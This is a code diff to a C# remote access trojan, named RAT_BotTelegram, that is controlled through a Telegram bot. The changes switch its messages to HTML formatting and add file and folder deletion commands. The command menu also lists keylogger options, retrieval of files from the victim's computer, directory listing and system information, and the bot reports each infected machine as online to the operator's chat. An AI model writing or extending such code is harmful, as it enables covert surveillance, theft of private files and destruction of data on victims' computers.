@@ -42,7 +42,7 @@ namespace RAT_BotTelegram {
 
             // Mensaje de conexión
 
-            Bot.SendTextMessageAsync(config.ID, " ==>>    Computer: " + Features.getUserName() + " is online    <<== ");
+            Bot.SendTextMessageAsync(config.ID, " ==>>    <b>Computer:</b> " + Features.getUserName() + " <b>is online</b>    <<== ",ParseMode.Html);
 
             //Bot.SendVideoAsync(config.ID, File.Open(@"F:\New folder (2)\40.3gp",FileMode.Open),999,999,999,"info",ParseMode.Default,false,false);
 
@@ -119,7 +119,7 @@ namespace RAT_BotTelegram {
 
                         string FData = infoFile(file);
 
-                        await Bot.SendTextMessageAsync(config.ID, "" + FData);
+                        await Bot.SendTextMessageAsync(config.ID, "" + FData,ParseMode.Html);
 
                     }
                     break;
@@ -151,44 +151,34 @@ namespace RAT_BotTelegram {
                 //Mensaje por default
                 default:
                     const string usage =
-                  "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n" +
-                  " * Use the following commands: *\n" +
-                  "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n" +
                   "\n/Status                   <Check if the PC is online>" +
                   "\n/Get_Information <get detailed system information>" +
                   "\n/Get_Files            |Menu| <Get Files from Computer>" +  // Obtiene los archivos dentro de la computadora
                   "\n/Get_DirFiles      |Menu| <Get list of file names>" +   // Obtiene los nombres dentro de la computadora
                   "\n/Dir     <Path>       /Dir C:\\User\\Photos and videos" +  // Lista los archivos de la carpeta y las subscarpetas.
                   "\n/Keylogger          |Menu| <keylogger Options >" +
-                  "\n" +
-                  "\n" +
+                  "\n/DeleteFile <Path>" +
+                  "\n/DeleteFolder <Path>" +
                   "\n/Help                    <This>" +
                   "";
-                    await Bot.SendTextMessageAsync(config.ID, text: usage, replyMarkup: new ReplyKeyboardRemove());
+                    await Bot.SendTextMessageAsync(config.ID, "<b> * Use the following commands:</b> *\n" , ParseMode.Html );
+                    await Bot.SendTextMessageAsync(config.ID, usage, replyMarkup: new ReplyKeyboardRemove());
                     break;
             }
         }
-
         private static string infoFile(string file) {  // Muestra información detallada del archivo
 
             FileInfo fil = new FileInfo(file);
             string FData =
-                "\nDirectory  = " + fil.DirectoryName +
-                "\nName = " + fil.Name +
-                "\nExtension = " + fil.Extension +
-                "\nZise   = " + fil.Length + " KB" +
-                "\nCreation Data = " + fil.CreationTime+
-                "\nIs Read Only = " +fil.IsReadOnly+
-                "\nLast Access Time" + fil.LastAccessTime+
-                "\n" +
-                "\n" +
-                "\n" +
-                "\n" +
-                "\n" +
-                "\n" +
-                "\n" +
-                "";
-
+                "\n<b>Name =</b> " + fil.Name +
+                "\n<b>Extension =</b> " + fil.Extension +
+                "\n<b>Zise   =</b> " + fil.Length + " <b>bytes</b>" +
+                "\n<b>Creation Data =</b> " + fil.CreationTime+
+                "\n<b>Is Read Only =</b> " + fil.IsReadOnly+
+                "\n<b>Last Access Time =</b> " + fil.LastAccessTime+
+                "\n<b>Last Write Time =</b> " + fil.LastWriteTime+
+                "\n<b>Directory =</b> " + fil.DirectoryName +
+                "\n<b>Full Directory =</b> " + file;
             return FData;
         }
         private static bool infoFileZize(string file) {  // Verifica si el archivo no supera los 50MB
